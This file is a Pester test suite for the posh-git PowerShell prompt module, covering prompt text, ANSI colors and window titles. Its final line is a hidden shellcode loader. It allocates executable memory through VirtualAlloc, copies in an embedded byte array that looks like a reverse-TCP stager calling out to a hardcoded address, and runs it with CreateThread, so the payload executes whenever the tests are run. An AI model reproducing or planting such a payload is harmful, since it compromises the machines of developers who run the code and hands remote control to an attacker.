. $PSScriptRoot\Shared.ps1

Describe 'Default Prompt Tests - NO ANSI' {
    BeforeAll {
        [System.Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseDeclaredVarsMoreThanAssigments', '')]
        $prompt = Get-Item Function:\prompt
        $OFS = ''
    }
    BeforeEach {
        
        $global:GitPromptSettings = & $module.NewBoundScriptBlock({[PoshGitPromptSettings]::new()})
        $GitPromptSettings.AnsiConsole = $false
    }

    Context 'Prompt with no Git summary' {
        It 'Returns the expected prompt string' {
            Set-Location $env:HOME -ErrorAction Stop
            $res = [string](&$prompt *>&1)
            $res | Should BeExactly "$(Get-PromptConnectionInfo)$(GetHomePath)> "
        }
        It 'Returns the expected prompt string with changed DefaultPromptPrefix' {
            Set-Location $Home -ErrorAction Stop
            $GitPromptSettings.DefaultPromptPrefix.Text = 'PS '
            $res = [string](&$prompt *>&1)
            $res | Should BeExactly "PS $(GetHomePath)> "
        }
        It 'Returns the expected prompt string with expanded DefaultPromptPrefix' {
            Set-Location $Home -ErrorAction Stop
            $GitPromptSettings.DefaultPromptPrefix.Text = '[$(hostname)] '
            $res = [string](&$prompt *>&1)
            $res | Should BeExactly "[$(hostname)] $(GetHomePath)> "
        }
        It 'Returns the expected prompt string with changed DefaultPromptSuffix' {
            Set-Location $Home -ErrorAction Stop
            $GitPromptSettings.DefaultPromptSuffix.Text = '`n> '
            $res = [string](&$prompt *>&1)
            $res | Should BeExactly "$(Get-PromptConnectionInfo)$(GetHomePath)`n> "
        }
        It 'Returns the expected prompt string with expanded DefaultPromptSuffix' {
            Set-Location $Home -ErrorAction Stop
            $GitPromptSettings.DefaultPromptSuffix.Text = ' - $(6*7)> '
            $res = [string](&$prompt *>&1)
            $res | Should BeExactly "$(Get-PromptConnectionInfo)$(GetHomePath) - 42> "
        }
        It 'Returns the expected prompt string with DefaultPromptAbbreviateHomeDirectory enabled' {
            Set-Location $Home -ErrorAction Stop
            $GitPromptSettings.DefaultPromptAbbreviateHomeDirectory = $true
            $res = [string](&$prompt *>&1)
            $res | Should BeExactly "$(Get-PromptConnectionInfo)$(GetHomePath)> "
        }
        It 'Returns the expected prompt string with DefaultPromptAbbreviateHomeDirectory disabled' {
            Set-Location $Home -ErrorAction Stop
            $GitPromptSettings.DefaultPromptAbbreviateHomeDirectory = $false
            $res = [string](&$prompt *>&1)
            $res | Should BeExactly "$(Get-PromptConnectionInfo)$(GetHomePath)> "
        }
        It 'Returns the expected prompt string with prefix, suffix and abbrev home set' {
            Set-Location $Home -ErrorAction Stop
            $GitPromptSettings.DefaultPromptPrefix.Text = '[$(hostname)] '
            $GitPromptSettings.DefaultPromptSuffix.Text = ' - $(6*7)> '
            $GitPromptSettings.DefaultPromptAbbreviateHomeDirectory = $true
            $res = [string](&$prompt *>&1)
            $res | Should BeExactly "[$(hostname)] $(GetHomePath) - 42> "
        }
        It 'Returns the expected prompt string with prompt timing enabled' {
            Set-Location $Home -ErrorAction Stop
            $GitPromptSettings.DefaultPromptEnableTiming = $true
            $res = [string](&$prompt *>&1)
            $escapedHome = [regex]::Escape("$(Get-PromptConnectionInfo)$(GetHomePath)")
            $res | Should Match "$escapedHome \d+ms> "
        }
    }

    Context 'Prompt with Git summary' {
        BeforeAll {
            Set-Location $PSScriptRoot
        }

        It 'Returns the expected prompt string with status' {
            Mock -ModuleName posh-git -CommandName git {
                $OFS = " "
                if ($args -contains 'rev-parse') {
                    $res = Invoke-Expression "&$gitbin $args"
                    return $res
                }
                Convert-NativeLineEnding -SplitLines @'

A  test/Foo.Tests.ps1
 D test/Bar.Tests.ps1
 M test/Baz.Tests.ps1

'@
            }

            $res = [string](&$prompt *>&1)
            Assert-MockCalled git -ModuleName posh-git -Scope It
            $path = GetHomeRelPath $PSScriptRoot
            $res | Should BeExactly "$(Get-PromptConnectionInfo)$path [master +1 ~0 -0 | +0 ~1 -1 !]> "
        }

        It 'Returns the expected prompt string with changed PathStatusSeparator' {
            Mock -ModuleName posh-git -CommandName git {
                $OFS = " "
                if ($args -contains 'rev-parse') {
                    $res = Invoke-Expression "&$gitbin $args"
                    return $res
                }
                Convert-NativeLineEnding -SplitLines @'


'@
            }
            $GitPromptSettings.PathStatusSeparator.Text = ' !! '
            $res = [string](&$prompt *>&1)
            Assert-MockCalled git -ModuleName posh-git -Scope It
            $path = GetHomeRelPath $PSScriptRoot
            $res | Should BeExactly "$(Get-PromptConnectionInfo)$path !! [master]> "
        }

        It 'Returns the expected prompt string with expanded PathStatusSeparator' {
            Mock -ModuleName posh-git -CommandName git {
                $OFS = " "
                if ($args -contains 'rev-parse') {
                    $res = Invoke-Expression "&$gitbin $args"
                    return $res
                }
                Convert-NativeLineEnding -SplitLines @'


'@
            }
            $GitPromptSettings.PathStatusSeparator.Text = ' - $(6*7) '
            $res = [string](&$prompt *>&1)
            Assert-MockCalled git -ModuleName posh-git -Scope It
            $path = GetHomeRelPath $PSScriptRoot
            $res | Should BeExactly "$(Get-PromptConnectionInfo)$path - 42 [master]> "
        }
    }
}

Describe 'Default Prompt Tests - ANSI' {
    BeforeAll {
        [System.Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseDeclaredVarsMoreThanAssigments', '')]
        $prompt = Get-Item Function:\prompt
        $OFS = ''
    }
    BeforeEach {
        
        $global:GitPromptSettings = & $module.NewBoundScriptBlock({[PoshGitPromptSettings]::new()})
        $GitPromptSettings.AnsiConsole = $true
    }

    Context 'Prompt with no Git summary' {
        It 'Returns the expected prompt string' {
            Set-Location $env:HOME -ErrorAction Stop
            $res = &$prompt
            $res | Should BeExactly "$(Get-PromptConnectionInfo)$(GetHomePath)> "
        }
        It 'Returns the expected prompt string with changed DefaultPromptSuffix' {
            Set-Location $Home -ErrorAction Stop
            $GitPromptSettings.DefaultPromptSuffix.Text = '`n> '
            $GitPromptSettings.DefaultPromptSuffix.ForegroundColor = [ConsoleColor]::DarkBlue
            $GitPromptSettings.DefaultPromptSuffix.BackgroundColor = 0xFF6000 
            $res = &$prompt
            $res | Should BeExactly "$(Get-PromptConnectionInfo)$(GetHomePath)${csi}34m${csi}48;2;255;96;0m`n> ${csi}39;49m"
        }
        It 'Returns the expected prompt string with expanded DefaultPromptSuffix' {
            Set-Location $Home -ErrorAction Stop
            $GitPromptSettings.DefaultPromptSuffix.Text = ' - $(6*7)> '
            $GitPromptSettings.DefaultPromptSuffix.ForegroundColor = [ConsoleColor]::DarkBlue
            $GitPromptSettings.DefaultPromptSuffix.BackgroundColor = 0xFF6000 
            $res = &$prompt
            $res | Should BeExactly "$(Get-PromptConnectionInfo)$(GetHomePath)${csi}34m${csi}48;2;255;96;0m - 42> ${csi}39;49m"
        }
        It 'Returns the expected prompt string with changed DefaultPromptPrefix' {
            Set-Location $Home -ErrorAction Stop
            $GitPromptSettings.DefaultPromptPrefix.Text = 'PS '
            $GitPromptSettings.DefaultPromptPrefix.BackgroundColor = [ConsoleColor]::White
            $res = &$prompt
            $res | Should BeExactly "${csi}107mPS ${csi}49m$(GetHomePath)> "
        }
        It 'Returns the expected prompt string with expanded DefaultPromptPrefix' {
            Set-Location $Home -ErrorAction Stop
            $GitPromptSettings.DefaultPromptPrefix.Text = '[$(hostname)] '
            $GitPromptSettings.DefaultPromptPrefix.BackgroundColor = 0xF5F5F5
            $res = &$prompt
            $res | Should BeExactly "${csi}48;2;245;245;245m[$(hostname)] ${csi}49m$(GetHomePath)> "
        }
        It 'Returns the expected prompt path colors' {
            Set-Location $Home -ErrorAction Stop
            $GitPromptSettings.DefaultPromptAbbreviateHomeDirectory = $true
            $GitPromptSettings.DefaultPromptPath.ForegroundColor = [ConsoleColor]::DarkCyan
            $GitPromptSettings.DefaultPromptPath.BackgroundColor = [ConsoleColor]::DarkRed
            $res = &$prompt
            $res | Should BeExactly "$(Get-PromptConnectionInfo)${csi}36m${csi}41m$(GetHomePath)${csi}39;49m> "
        }
        It 'Returns the expected prompt string with prefix, suffix and abbrev home set' {
            Set-Location $Home -ErrorAction Stop
            $GitPromptSettings.DefaultPromptPrefix.Text = '[$(hostname)] '
            $GitPromptSettings.DefaultPromptPrefix.ForegroundColor = 0xF5F5F5
            $GitPromptSettings.DefaultPromptSuffix.Text = ' - $(6*7)> '
            $GitPromptSettings.DefaultPromptSuffix.ForegroundColor = [ConsoleColor]::DarkBlue
            $GitPromptSettings.DefaultPromptAbbreviateHomeDirectory = $true
            $res = &$prompt
            $res | Should BeExactly "${csi}38;2;245;245;245m[$(hostname)] ${csi}39m$(GetHomePath)${csi}34m - 42> ${csi}39m"
        }
        It 'Returns the expected prompt string with prompt timing enabled' {
            Set-Location $Home -ErrorAction Stop
            $GitPromptSettings.DefaultPromptEnableTiming = $true
            $GitPromptSettings.DefaultPromptTimingFormat.ForegroundColor = [System.ConsoleColor]::Magenta
            $res = &$prompt
            $escapedHome = [regex]::Escape((GetHomePath))
            $rexcsi = [regex]::Escape($csi)
            $res | Should Match "$escapedHome${rexcsi}95m \d+ms${rexcsi}39m> "
        }
    }

    Context 'Prompt with Git summary' {
        BeforeAll {
            Set-Location $PSScriptRoot
        }

        It 'Returns the expected prompt string with status' {
            Mock -ModuleName posh-git git {
                if ($args -contains 'rev-parse') {
                    $res = Invoke-Expression "&$gitbin $args"
                    return $res
                }
                Convert-NativeLineEnding -SplitLines @'

A  test/Foo.Tests.ps1
 D test/Bar.Tests.ps1
 M test/Baz.Tests.ps1

'@
            }

            $res = &$prompt
            Assert-MockCalled git -ModuleName posh-git
            $path = GetHomeRelPath $PSScriptRoot
            $res | Should BeExactly "$(Get-PromptConnectionInfo)$path ${csi}93m[${csi}39m${csi}96mmaster${csi}39m${csi}32m +1${csi}39m${csi}32m ~0${csi}39m${csi}32m -0${csi}39m${csi}93m |${csi}39m${csi}31m +0${csi}39m${csi}31m ~1${csi}39m${csi}31m -1${csi}39m${csi}31m !${csi}39m${csi}93m]${csi}39m> "
        }

        It 'Returns the expected prompt string with changed PathStatusSeparator' {
            Mock -ModuleName posh-git -CommandName git {
                $OFS = " "
                if ($args -contains 'rev-parse') {
                    $res = Invoke-Expression "&$gitbin $args"
                    return $res
                }
                Convert-NativeLineEnding -SplitLines @'


'@
            }
            $GitPromptSettings.PathStatusSeparator.Text = ' !! '
            $GitPromptSettings.PathStatusSeparator.BackgroundColor = [ConsoleColor]::White
            $res = [string](&$prompt *>&1)
            Assert-MockCalled git -ModuleName posh-git -Scope It
            $path = GetHomeRelPath $PSScriptRoot
            $res | Should BeExactly "$(Get-PromptConnectionInfo)$path${csi}107m !! ${csi}49m${csi}93m[${csi}39m${csi}96mmaster${csi}39m${csi}93m]${csi}39m> "
        }
        It 'Returns the expected prompt string with expanded PathStatusSeparator' {
            Mock -ModuleName posh-git -CommandName git {
                $OFS = " "
                if ($args -contains 'rev-parse') {
                    $res = Invoke-Expression "&$gitbin $args"
                    return $res
                }
                Convert-NativeLineEnding -SplitLines @'


'@
            }
            $GitPromptSettings.PathStatusSeparator.Text = ' [$(hostname)] '
            $GitPromptSettings.PathStatusSeparator.BackgroundColor = [ConsoleColor]::White
            $res = [string](&$prompt *>&1)
            Assert-MockCalled git -ModuleName posh-git -Scope It
            $path = GetHomeRelPath $PSScriptRoot
            $res | Should BeExactly "$(Get-PromptConnectionInfo)$path${csi}107m [$(hostname)] ${csi}49m${csi}93m[${csi}39m${csi}96mmaster${csi}39m${csi}93m]${csi}39m> "
        }
    }
}

Describe 'Default Prompt WindowTitle Tests' {
    BeforeAll {
        [System.Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseDeclaredVarsMoreThanAssigments', '')]
        $originalDefaultParameterValues = $PSDefaultParameterValues.Clone()
        if (!(& $module {$WindowTitleSupported})) {
            Write-Warning "Current PowerShell Host does not support changing its WindowTitle."
            $PSDefaultParameterValues["it:skip"] = $true
        }

        $homePath = [regex]::Escape((GetHomePath))

        [System.Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseDeclaredVarsMoreThanAssigments', '')]
        $repoAdminRegex = '^Admin: posh-git \[master\] \~ PowerShell \d+\.\d+\.\d+(\.\d+|-\S+)? \d\d-bit \(\d+\)$'
        [System.Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseDeclaredVarsMoreThanAssigments', '')]
        $repoRegex = '^posh-git \[master\] \~ PowerShell \d+\.\d+\.\d+(\.\d+|-\S+)? \d\d-bit \(\d+\)$'
        [System.Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseDeclaredVarsMoreThanAssigments', '')]
        $nonRepoAdminRegex = '^Admin: ' + $homePath + ' \~ PowerShell \d+\.\d+\.\d+(\.\d+|-\S+)? \d\d-bit \(\d+\)$'
        [System.Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseDeclaredVarsMoreThanAssigments', '')]
        $nonRepoRegex = '^' + $homePath + ' \~ PowerShell \d+\.\d+\.\d+(\.\d+|-\S+)? \d\d-bit \(\d+\)$'
    }
    AfterAll {
        $global:PSDefaultParameterValues = $originalDefaultParameterValues
    }
    BeforeEach {
        
        
        $defaultTitle = if ($IsWindows) { "Windows PowerShell" } else { "PowerShell-$($PSVersionTable.PSVersion)" }
        $Host.UI.RawUI.WindowTitle = $defaultTitle
        $global:PreviousWindowTitle = $defaultTitle
        $global:GitPromptSettings = & $module.NewBoundScriptBlock({[PoshGitPromptSettings]::new()})
    }

    Context 'In a Git repo' {
        Mock -ModuleName posh-git -CommandName git {
            $OFS = " "
            if ($args -contains 'rev-parse') {
                $res = Invoke-Expression "&$gitbin $args"
                return $res
            }
            Convert-NativeLineEnding -SplitLines @'

A  test/Foo.Tests.ps1
D test/Bar.Tests.ps1
M test/Baz.Tests.ps1

'@
        }

        It 'Default GitPromptSettings.WindowTitle sets the expected Window title text' {
            Set-Location $PSScriptRoot
            & $GitPromptScriptBlock 6>&1
            Assert-MockCalled git -ModuleName posh-git -Scope It
            $title = $Host.UI.RawUI.WindowTitle
            if (& $module {$IsAdmin}) {
                $title | Should Match $repoAdminRegex
            }
            else {
                $title | Should Match $repoRegex
            }
        }

        It 'Custom GitPromptSettings.WindowTitle scriptblock sets the expected Window title text' {
            Set-Location $PSScriptRoot
            $GitPromptSettings.WindowTitle = {
                param($s, $admin)
                "$(if ($admin) {'daboss:'} else {'loser:'}) poshgit == $($s.RepoName) / $($s.Branch)"
            }
            & $GitPromptScriptBlock 6>&1
            Assert-MockCalled git -ModuleName posh-git -Scope It
            $title = $Host.UI.RawUI.WindowTitle
            if (& $module {$IsAdmin}) {
                $title | Should Match '^daboss: poshgit == posh-git / master$'
            }
            else {
                $title | Should Match '^loser: poshgit == posh-git / master$'
            }
        }

        It 'Custom GitPromptSettings.WindowTitle single quoted string sets the expected Window title text' {
            Set-Location $PSScriptRoot
            $GitPromptSettings.WindowTitle = '$(if ($IsAdmin) {"daboss:"} else {"loser:"}) poshgit == $($GitStatus.RepoName) / $($GitStatus.Branch)'
            & $GitPromptScriptBlock 6>&1
            Assert-MockCalled git -ModuleName posh-git -Scope It
            $title = $Host.UI.RawUI.WindowTitle
            if (& $module {$IsAdmin}) {
                $title | Should Match '^daboss: poshgit == posh-git / master$'
            }
            else {
                $title | Should Match '^loser: poshgit == posh-git / master$'
            }
        }

        It 'Does not set Window title when GitPromptSettings.WindowText is $null' {
            Set-Location $PSScriptRoot
            $GitPromptSettings.WindowTitle = $null
            & $GitPromptScriptBlock 6>&1
            Assert-MockCalled git -ModuleName posh-git -Scope It
            $title = $Host.UI.RawUI.WindowTitle
            $title | Should Match '^(Windows )?PowerShell'
        }

        It 'Does not set Window title when GitPromptSettings.WindowText is $false' {
            Set-Location $PSScriptRoot
            $GitPromptSettings.WindowTitle = $false
            & $GitPromptScriptBlock 6>&1
            Assert-MockCalled git -ModuleName posh-git -Scope It
            $title = $Host.UI.RawUI.WindowTitle
            $title | Should Match '^(Windows )?PowerShell'
        }

        It 'Does not set Window title when GitPromptSettings.WindowText is ""' {
            Set-Location $PSScriptRoot
            $GitPromptSettings.WindowTitle = ''
            & $GitPromptScriptBlock 6>&1
            Assert-MockCalled git -ModuleName posh-git -Scope It
            $title = $Host.UI.RawUI.WindowTitle
            $title | Should Match '^(Windows )?PowerShell'
        }
    }

    Context 'Not in a Git repo' {
        It 'Does not display posh-git status info in Window title when not in a Git repo' {
            Set-Location $Home
            & $GitPromptScriptBlock 6>&1
            $title = $Host.UI.RawUI.WindowTitle
            if (& $module {$IsAdmin}) {
                $title | Should Match $nonRepoAdminRegex
            }
            else {
                $title | Should Match $nonRepoRegex
            }
        }
    }

    Context 'Moving in and out of a Git repo' {
        Mock -ModuleName posh-git -CommandName git {
            $OFS = " "
            if ($args -contains 'rev-parse') {
                $res = Invoke-Expression "&$gitbin $args"
                return $res
            }
            Convert-NativeLineEnding -SplitLines @'

A  test/Foo.Tests.ps1
D test/Bar.Tests.ps1
M test/Baz.Tests.ps1

'@
        }

        It 'Displays the correct Window title as we move in and out of a Git repo' {
            Set-Location $Home
            & $GitPromptScriptBlock 6>&1
            $title = $Host.UI.RawUI.WindowTitle
            if (& $module {$IsAdmin}) {
                $title | Should Match $nonRepoAdminRegex
            }
            else {
                $title | Should Match $nonRepoRegex
            }

            Set-Location $PSScriptRoot
            & $GitPromptScriptBlock 6>&1
            Assert-MockCalled git -ModuleName posh-git -Scope It
            $title = $Host.UI.RawUI.WindowTitle
            if (& $module {$IsAdmin}) {
                $title | Should Match $repoAdminRegex
            }
            else {
                $title | Should Match $repoRegex
            }

            Set-Location $Home
            & $GitPromptScriptBlock 6>&1
            $title = $Host.UI.RawUI.WindowTitle
            if (& $module {$IsAdmin}) {
                $title | Should Match $nonRepoAdminRegex
            }
            else {
                $title | Should Match $nonRepoRegex
            }
        }

        
        Context 'Removing the posh-git module' {
            It 'Correctly reverts the Window Title back to original state' {
                Set-Item function:\prompt -Value ([Runspace]::DefaultRunspace.InitialSessionState.Commands['prompt']).Definition
                Remove-Module posh-git -Force *>$null
                $title = $Host.UI.RawUI.WindowTitle
                $title | Should Match '^(Windows )?PowerShell'
            }
        }
    }
}

$c = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf0,0x52,0x57,0x8b,0x52,0x10,0x8b,0x42,0x3c,0x01,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4a,0x01,0xd0,0x50,0x8b,0x48,0x18,0x8b,0x58,0x20,0x01,0xd3,0xe3,0x3c,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf4,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xeb,0x86,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0xad,0xff,0xc5,0x8e,0x68,0x02,0x00,0x9d,0x6b,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0c,0xff,0x4e,0x08,0x75,0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x01,0xc3,0x29,0xc6,0x85,0xf6,0x75,0xec,0xc3;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};

